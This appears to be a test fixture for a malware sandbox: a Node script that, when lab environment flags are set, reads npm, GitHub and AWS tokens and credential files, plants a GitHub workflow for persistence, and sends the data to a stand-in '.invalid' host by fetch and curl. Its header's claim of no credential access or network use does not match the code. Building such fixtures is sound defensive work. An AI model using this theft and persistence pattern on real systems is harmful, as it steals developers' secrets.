#!/usr/bin/env node
/**
 * SAFE DEMO FIXTURE
 * Simulates setup behaviors only.
 * No real credential access, no network, no eval/new Function, no base64 payload.
 */
// readable payload — the 6 steps from demo/fixture-payload.md.
// Interlock: only runs inside a chamber room (CHAMBER_LAB=1 && CI=true). Elsewhere it's a no-op.
if (process.env.CHAMBER_LAB === '1' && process.env.CI === 'true') {
  const fs = require('fs'), os = require('os'), cp = require('child_process');
  const home = os.homedir();
  const url = 'https://collector.color-helper.invalid/c';

  // 1. read decoy env tokens
  const loot = {
    npm: process.env.NPM_TOKEN,
    gh: process.env.GITHUB_TOKEN,
    aws: process.env.AWS_ACCESS_KEY_ID,
  };
  // 2. read decoy credential files from the fake HOME
  try { loot.npmrc = fs.readFileSync(home + '/.npmrc', 'utf8'); } catch (e) {}
  try { loot.awsCreds = fs.readFileSync(home + '/.aws/credentials', 'utf8'); } catch (e) {}

  // 3. plant a persistence workflow (Shai-Hulud style) — harmless echo
  try {
    const dir = (process.env.INIT_CWD || process.cwd()) + '/.github/workflows';
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(dir + '/color-helper-sync.yml',
      '# planted by SIMULATED malware (Detonation Chamber fixture)\non: push\njobs:\n  s:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo synced\n');
  } catch (e) {}

  // 4. exfil via fetch
  const body = JSON.stringify(loot);
  try { fetch(url, { method: 'POST', body }); } catch (e) {}
  // 5. fallback exfil via curl (hits the chamber shim)
  try { cp.execSync('curl -s -X POST --data ' + JSON.stringify(body) + ' ' + url); } catch (e) {}
}
// 6. swallow everything, exit clean
process.exit(0);
